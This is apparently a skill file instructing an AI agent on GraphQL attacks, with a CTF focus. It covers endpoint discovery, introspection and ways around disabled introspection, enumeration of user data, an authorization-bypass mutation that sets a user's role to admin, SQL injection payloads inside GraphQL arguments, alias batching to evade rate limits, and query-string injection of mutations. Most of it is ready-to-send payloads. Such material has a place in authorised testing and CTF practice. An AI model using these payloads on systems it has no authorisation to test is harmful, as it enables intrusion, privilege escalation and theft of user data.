---
name: graphql-methodology
description: "GraphQL API security testing. Use when a /graphql endpoint is discovered, queries are sent as POST JSON, a GraphQL Playground/Explorer page exists, or responses contain the data/errors JSON structure. Covers introspection disclosure, injection attacks, authorization bypass, and nested-query DoS"
zh-signals: "GraphQL API 安全测试，覆盖 Introspection、注入、权限绕过与嵌套查询 DoS。信号:GraphQL,Introspection,注入攻击,权限绕过,API安全"
when-to-use: >-
  Use when a GraphQL endpoint is discovered and you need introspection, injection, authorization bypass, or nested-query DoS testing.
metadata:
  tags: "graphql,graphql injection,api,introspection,injection,authorization"
  category: "exploit"
---

# GraphQL Attack Methodology


## Phase 1: Discover GraphQL Endpoints
Common paths: `/graphql`, `/api/graphql`, `/graphiql`, `/v1/graphql`, `/query`
Detection: POST `{"query":"{ __typename }"}` → returns `{"data":{"__typename":"Query"}}` confirms it

## Phase 2: Introspection Queries (most important)
Retrieve the complete schema:
```json
{"query":"{ __schema { types { name fields { name type { name } } } } }"}
```

Condensed version (Query and Mutation only):
```json
{"query":"{ __schema { queryType { fields { name args { name type { name } } } } mutationType { fields { name args { name type { name } } } } } }"}
```

**Introspection results contain all type definitions and fields** — this is the most important information source

### 2.1 Bypassing Disabled Introspection

**Method 1: Field Suggestion**
The GraphQL engine suggests the correct field name for misspellings:
```json
{"query":"{ __typena }"}
→ "Did you mean '__typename'?"
```
Exploit this feature to enumerate fields: send wrong field names and obtain the real field names from the suggestions.

**Method 2: GET Request Bypass**
Some WAFs only block POST introspection, so bypass with GET:
```
GET /graphql?query={__schema{types{name,fields{name}}}}
```

**Method 3: Alias/Fragment Bypass**
```json
{"query":"{ a: __schema { types { name } } }"}
{"query":"fragment f on __Schema { types { name } } { __schema { ...f } }"}
```

**Method 4: Whitespace/Newline Variants**
```json
{"query":"\n{ __schema\n{ types\n{ name } } }"}
```

> GraphQL field names are case-sensitive and the standard introspection field is `__schema`; `__SCHEMA` is not a valid case-based bypass.

**Method 5: Field-by-Field Guessing**
If none of the above works, guess based on common naming:
```json
{"query":"{ user { id } }"}
{"query":"{ users { id } }"}
{"query":"{ flag }"}
{"query":"{ admin { flag } }"}
{"query":"{ getUser(id:1) { id } }"}
```

## Phase 3: Data Enumeration
Query each one according to the schema:
```json
{"query":"{ users { id username email role } }"}
{"query":"{ user(id: 1) { id username email role flag } }"}
{"query":"{ flag }"}
{"query":"{ admin { flag } }"}
{"query":"{ posts { id title content author } }"}
```
Watch for hidden fields (present in the schema but not displayed on the page)

## Phase 4: Authorization Bypass
1. Directly query admin fields:
   ```json
   {"query":"mutation { updateUser(id: 1, role: \"admin\") { id role } }"}
   ```
2. Nested queries (Batch attack):
   ```json
   {"query":"{ user(id:1){flag} user2:user(id:2){flag} }"}
   ```
3. Alias-based ID traversal:
   ```json
   {"query":"{ u1:user(id:1){id,name,flag} u2:user(id:2){id,name,flag} u3:user(id:3){id,name,flag} }"}
   ```

## Phase 5: Injection
SQL injection in GraphQL parameters:
```json
{"query":"{ user(name: \"admin' OR '1'='1\") { id flag } }"}
{"query":"{ search(keyword: \"' UNION SELECT flag FROM flags--\") { results } }"}
```

## Phase 6: Advanced Techniques
- Tooling: Clairvoyance, graphql-cop and other automation tools help discover hidden fields
- Batching: request multiple results in a single query `{a:user(id:1){name} b:user(id:2){name}}`
- WAF bypass: URL encoding (`%7B`) bypass; newline/whitespace variants

---

## Additional CTF GraphQL Techniques

### Alias Batching to Bypass Rate Limits
Repeat the same mutation (such as voting/authentication) with aliases in a single request to bypass rate limiting:
```graphql
mutation {
  a1: vote(id: "target") { ok }
  a2: vote(id: "target") { ok }
  # repeat N times...
}
```
You can also batch with an array: `POST body: [{"query":"mutation{...}"}, {"query":"mutation{...}"}, ...]`

### String Interpolation Injection
When the server concatenates GraphQL query strings, injection similar to SQLi is possible:
```javascript
// Input: ") { result } } mutation { adminAction(secret: true) { flag } } #
// Close the original query and inject a new mutation
```
